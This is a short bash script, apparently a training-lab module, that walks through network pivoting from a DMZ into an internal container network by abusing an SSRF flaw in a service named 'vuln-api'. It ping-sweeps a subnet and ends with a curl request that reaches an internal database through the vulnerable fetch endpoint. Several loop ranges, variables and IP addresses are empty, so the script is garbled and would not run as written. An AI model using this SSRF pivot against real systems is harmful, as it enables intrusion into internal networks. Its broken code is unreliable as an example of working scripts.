#!/usr/bin/env bash
# MODULE 9: Inter-Container Network Pivoting
# Scenario: Pivot from DMZ into internal network via SSRF

echo "[*] Mapping attacker network position..."
ip addr show
ip route

echo "[*] Discovering live hosts on DMZ (172.21.0.0/24)..."
for i in ; do
  ping -c1 -W1 172.21.0. > /dev/null 2>&1 && echo "[+] 172.21.0. is UP"
done

echo "[*] Exploiting SSRF on vuln-api to reach internal network..."
for i in ; do
  RESP=
  [ -n "" ] && echo "[!] Internal host reachable via SSRF: 172.22.0."
done

echo "[*] Pivoting to internal-db via SSRF..."
curl -sf "http://vuln-api:3000/fetch?url=http://internal-db:5432" 2>/dev/null | strings | head -5
